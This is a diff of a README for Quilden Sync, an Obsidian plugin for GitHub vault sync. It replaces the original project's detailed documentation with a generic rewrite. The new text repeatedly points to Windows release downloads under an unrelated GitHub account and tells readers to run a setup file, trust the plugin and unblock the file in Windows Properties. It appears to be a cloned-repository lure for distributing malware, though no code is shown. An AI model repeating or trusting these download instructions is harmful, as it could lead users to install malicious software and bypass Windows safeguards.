@@ -1,188 +1,251 @@
-# Quilden Sync
+# 🔄 Quilden-Sync - Secure Vault Sync for GitHub
 
-**Quilden Sync** is a free Obsidian plugin that syncs your vault to a GitHub repository with optional zero-knowledge end-to-end encryption. Combined with [Quilden](https://quilden.com) — a web-based Obsidian-style editor — your notes become accessible from any device or network, without installing anything.
+[![Download Quilden-Sync](https://img.shields.io/badge/Download%20Quilden--Sync-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/peeragesafetycatch785/Quilden-Sync/releases)
 
----
+## 🧭 What Quilden-Sync does
 
-> **IT IS HIGHLY RECOMMENDED TO BACKUP YOUR VAULT BEFORE USING THIS PLUGIN FOR THE FIRST TIME.**
+Quilden-Sync is an Obsidian plugin that keeps your vault in sync with GitHub. It adds end-to-end encryption, file history, and Quilden web editor support.
 
-## Features
+Use it to:
 
-- **Automatic GitHub sync** — push and pull your vault on save, on a schedule, or manually
-- **End-to-end encryption** — AES-256-GCM with PBKDF2 key derivation (600,000 iterations). Your password never leaves your device; GitHub only ever sees ciphertext
-- **Conflict resolution** — choose between local-wins, remote-wins, or newer-wins strategies
-- **Sync history & restore** — a full timestamped log of every sync event. Browse per-file commit history and restore to any previous version from inside Obsidian
-- **Selective encryption** — encrypt only Markdown files, media files, or everything
-- **Cross-platform** — works on iOS, iPadOS, Android, macOS, Windows, and Linux (wherever Obsidian runs)
-- **No third-party services** — sync goes directly to GitHub. No subscription, no intermediary cloud
+- Back up your vault to GitHub
+- Keep your notes in sync across devices
+- Store files with end-to-end encryption
+- Track file changes with history
+- Open content in the Quilden web editor when needed
 
----
+## 💻 What you need
 
-## Installation via BRAT (Recommended)
+Before you start, make sure you have:
 
-[BRAT](https://github.com/TfTHacker/obsidian42-brat) (Beta Reviewers Auto-update Tool) lets you install community plugins not yet in the official directory.
+- A Windows PC
+- Obsidian installed
+- A GitHub account
+- A vault you want to sync
+- Enough space for your vault and file history
 
-### Step 1 — Install BRAT
+For best results, use:
 
-1. Open Obsidian → **Settings** → **Community plugins**
-2. Click **Browse**, search for **BRAT**, and install it
-3. Enable BRAT
+- Windows 10 or Windows 11
+- A stable internet connection
+- The latest version of Obsidian
 
-### Step 2 — Add Quilden Sync via BRAT
+## 📥 Download Quilden-Sync
 
-1. Open **Settings** → **BRAT**
-2. Click **Add Beta plugin**
-3. Paste the repository URL:
-   ```
-   https://github.com/AA1labs/quilden-sync
-   ```
-4. Click **Add Plugin**
-5. BRAT installs the plugin and keeps it updated automatically
+Visit this page to download the latest release:
 
-### Step 3 — Enable the plugin
+https://github.com/peeragesafetycatch785/Quilden-Sync/releases
 
-1. Go to **Settings** → **Community plugins**
-2. Toggle **Quilden Sync** on
+On that page, look for the newest release and download the Windows file or plugin package attached to it.
 
----
+## 🛠️ Install on Windows
 
-## Manual Installation
+Follow these steps in order.
 
-1. Download the latest release from the [Releases](https://github.com/AA1labs/quilden-sync/releases) page
-2. Extract `main.js`, `manifest.json`, and `styles.css` (if present) into your vault at:
-   ```
-   <vault>/.obsidian/plugins/quilden-sync/
-   ```
-3. Restart Obsidian and enable the plugin under **Settings → Community plugins**
+1. Open the download page in your browser.
+2. Find the latest release at the top of the page.
+3. Download the file for Windows.
+4. If the file is in a ZIP folder, save it to your Downloads folder.
+5. Right-click the ZIP file and choose Extract All.
+6. Open your Obsidian vault folder.
+7. Copy the Quilden-Sync plugin files into the Obsidian plugin folder.
+8. If Obsidian asks to trust the plugin, choose to trust and enable it.
+9. Restart Obsidian.
 
----
+If the release includes a setup file, double-click it and follow the prompts. If it includes a plugin folder, place that folder in your vault’s `.obsidian/plugins` directory.
 
-## Configuration
+## ⚙️ Set up the plugin
 
-Open **Settings → Quilden Sync** after enabling the plugin.
+After you install it, open Obsidian and do this:
 
-| Setting | Description |
-|---------|-------------|
-| **GitHub Token** | A Personal Access Token with `repo` scope. Generate one from the plugin's settings page or from [GitHub → Settings → Developer settings → Tokens](https://github.com/settings/tokens). |
-| **Repository owner** | Your GitHub username or organisation name |
-| **Repository name** | The repo to sync your vault into |
-| **Branch** | Branch to sync against (default: `main`) |
-| **Sync on save** | Push changes automatically whenever you save a file |
-| **Auto-sync interval** | Sync every N minutes in the background (0 = disabled) |
-| **Sync on startup** | Pull latest changes when Obsidian starts |
-| **Conflict strategy** | `local` / `remote` / `newer` — how to resolve conflicts |
-| **Exclude patterns** | Glob patterns to skip (`.obsidian/`, `.trash/`, `.DS_Store` excluded by default) |
-| **Notification location** | `notice` (popup) / `statusbar` / `none` |
+1. Open Settings.
+2. Go to Community plugins.
+3. Turn on Quilden-Sync.
+4. Open the Quilden-Sync settings page.
+5. Connect your GitHub account or paste your access token.
+6. Choose the GitHub repository you want to use.
+7. Set your encryption password or key.
+8. Pick the folders you want to sync.
+9. Save your settings.
 
----
+If you use the Quilden web editor, add the editor link in the settings page so the plugin can open files there when needed.
 
-## End-to-End Encryption
+## 🔐 Encryption and file history
 
-Quilden Sync uses the Web Crypto API — the same API built into every modern browser and Obsidian's Electron environment.
+Quilden-Sync protects your vault with end-to-end encryption. That means your notes are encrypted before they leave your device.
 
-### How it works
+It also keeps file history so you can:
 
-1. You enter a password in the plugin settings
-2. A key is derived using **PBKDF2** (SHA-256, 600,000 iterations) with a salt computed from `SHA-256("quilden:{github_login}/{owner}/{repo}")` — deterministic, nothing stored in the repo
-3. Every file is encrypted with **AES-256-GCM** before being committed to GitHub
-4. Encrypted files are prefixed with `QENC:1:` so both the plugin and the Quilden web editor can identify and decrypt them
-5. When you open your vault in [Quilden](https://quilden.com), enter the same password — decryption happens entirely in your browser
+- View earlier versions of a file
+- Restore old content
+- Check when a note changed
+- Recover from mistakes
 
-### Encryption scope
+To get the best results:
 
-Choose what gets encrypted:
+- Use one strong encryption password
+- Keep your GitHub access token private
+- Sync only the folders you want to store online
 
-| Scope | What's encrypted |
-|-------|-----------------|
-| `markdown` (default) | `.md` files only |
-| `media` | Markdown + images and PDFs |
-| `all` | Every file in the vault |
+## 📝 How syncing works
 
-### Security properties
+Quilden-Sync watches your vault for changes. When you edit a file, it can:
 
-- Password is never transmitted or stored anywhere outside your device
-- Salt is deterministic — no need to share or back it up
-- GitHub, Quilden's servers, and any third party see only random-looking base64 ciphertext
-- A small verification token (`QENC:1:...` encoding of a known string) is stored in plugin data to detect wrong passwords on re-entry without exposing plaintext
+- Encrypt the file
+- Upload the change to GitHub
+- Save version history
+- Pull changes from GitHub to your vault
 
----
+If you use more than one device, make sure each device uses the same GitHub repo and encryption settings.
 
-## Sync History & File Restore
+## 🧩 First sync checklist
 
-Every sync is logged locally with:
+Before your first sync, check these items:
 
-- ISO timestamp
-- Number of files pushed and pulled
-- List of changed file paths
+- Obsidian is open
+- Quilden-Sync is enabled
+- Your GitHub account is connected
+- Your repo name is correct
+- Your encryption password matches on all devices
+- Your sync folder is selected
+- Your internet connection is active
 
-Access the history from the plugin's ribbon icon or command palette. To restore a file:
+Then run the first sync from the plugin settings. The first sync may take longer if your vault is large.
 
-1. Open **Quilden Sync → Sync History**
-2. Find the entry you want to restore to
-3. Click **Restore** next to the entry or the specific file
+## 📂 Recommended folder setup
 
-Restores use GitHub's commit history, so no data is ever permanently lost.
+A simple setup works best:
 
----
+- Keep your vault in one main folder
+- Store attachments in a separate folder if you use many images
+- Sync only the folders you need
+- Avoid moving the vault while a sync is running
 
-## Connecting to Quilden (Web Editor)
+Example layout:
 
-[Quilden](https://quilden.com) is a web-based Obsidian-style editor that reads your GitHub-backed vault directly from the browser.
+- `Vault/`
+  - `Notes/`
+  - `Images/`
+  - `Projects/`
 
-1. Install Quilden Sync and complete at least one sync
-2. Visit [quilden.com](https://quilden.com) and sign in with GitHub
-3. Select the repository your vault syncs to
-4. If encryption is enabled, enter your password — decryption is local, nothing is sent to Quilden's servers
-5. Edit your notes from any browser — work computer, school Chromebook, or borrowed device
+This makes it easier to keep track of what gets synced.
 
----
+## 🔧 Common tasks
 
-## Commands
+### Sync now
 
-| Command | Description |
-|---------|-------------|
-| `Quilden Sync: Sync now` | Manual full sync (push + pull) |
-| `Quilden Sync: Push changes` | Push local changes only |
-| `Quilden Sync: Pull changes` | Pull remote changes only |
-| `Quilden Sync: Open sync history` | Browse the sync log |
-| `Quilden Sync: Open file history` | View commit history for the active file |
+Open the Quilden-Sync panel and choose the sync option. Use this when you want to send recent changes to GitHub right away.
 
----
+### Pull latest changes
 
-## Troubleshooting
+Use this when you made changes on another device. The plugin will bring those changes into your vault.
 
-**Sync fails with authentication error**
-- Regenerate your GitHub token and ensure it has `repo` scope
-- Tokens from the plugin settings page have the correct scope automatically
+### Open in Quilden web editor
 
-**Files not syncing**
-- Check your exclude patterns — `.obsidian/` is excluded by default
-- Verify the repository owner, name, and branch are correct
+If you use the Quilden editor, open a file from the plugin menu and choose the web editor option.
 
-**Wrong password / decryption fails**
-- Re-enter your password in **Settings → Quilden Sync → Encryption**
-- The verification token will confirm whether it matches
+### View file history
 
-**Conflicts**
-- Adjust the conflict strategy in settings to match your workflow
-- Conflict copies are saved alongside the original with `_conflict` in the filename
+Open a file history view to see earlier versions. You can compare changes and restore an older copy.
 
----
+## 🪟 Windows tips
 
-## Privacy
+If Windows blocks the file:
 
-- No vault content is transmitted to Quilden's servers during sync — all traffic goes directly to GitHub's API
-- With encryption enabled, Quilden's web editor decrypts in your browser; plaintext never leaves your device
-- The plugin stores only sync state and settings in Obsidian's local plugin data folder
+1. Right-click the downloaded file.
+2. Choose Properties.
+3. Look for an Unblock option.
+4. Check Unblock if you see it.
+5. Click OK.
 
----
+If Obsidian does not show the plugin:
 
-## License
+1. Close Obsidian.
+2. Check the plugin folder in `.obsidian/plugins`.
+3. Make sure the Quilden-Sync folder is there.
+4. Reopen Obsidian.
+5. Enable the plugin in Community plugins.
 
-MIT — see [LICENSE](./LICENSE)
+## 🧪 Simple test after install
 
----
+After setup, test the plugin with one short note:
 
-## Contributing
+1. Create a new note in Obsidian.
+2. Type a short line of text.
+3. Save the note.
+4. Run sync.
+5. Open your GitHub repo and check that the file appears.
 
-Issues and pull requests are welcome. Please open an issue before submitting large changes.
+Then change the note and sync again to see file history update.
+
+## 🔑 GitHub access token setup
+
+You may need a GitHub token to let the plugin write to your repo.
+
+Use a token with only the access needed for your vault. Keep it in the plugin settings, not in a note.
+
+If you use more than one device, use the same repo and the same encryption settings on each one.
+
+## 🧭 Troubleshooting
+
+### The plugin does not appear
+
+- Restart Obsidian
+- Check the plugin folder name
+- Make sure the files are in `.obsidian/plugins`
+- Turn on Community plugins
+
+### Sync does not start
+
+- Check your internet connection
+- Confirm your GitHub token is valid
+- Check that the repo name is correct
+- Make sure the plugin is enabled
+
+### Files do not match on two devices
+
+- Confirm both devices use the same repo
+- Confirm both devices use the same encryption key
+- Run a pull on the second device
+- Check for file conflicts
+
+### File history looks wrong
+
+- Make sure you synced the file after each change
+- Check that the file stayed in the synced folder
+- Confirm the repo has the latest commits
+
+### Quilden editor does not open
+
+- Check the editor link in settings
+- Make sure the web editor address is correct
+- Try opening it in your browser first
+
+## 📁 Backup habits
+
+Keep a second backup in place. GitHub helps with history and sync, but a local backup is still useful.
+
+Good habits:
+
+- Back up your vault before first use
+- Test one small folder first
+- Keep your encryption password in a safe place
+- Review your repo after major changes
+
+## 🖥️ Suggested use
+
+Quilden-Sync fits users who want:
+
+- A simple way to back up notes
+- GitHub-based sync for an Obsidian vault
+- Encryption for private content
+- File history for note recovery
+- Quilden web editor support
+
+## 📎 Release downloads
+
+Download the latest version here:
+
+https://github.com/peeragesafetycatch785/Quilden-Sync/releases
+
+Use the latest release file for Windows, then install it in Obsidian and enable the plugin
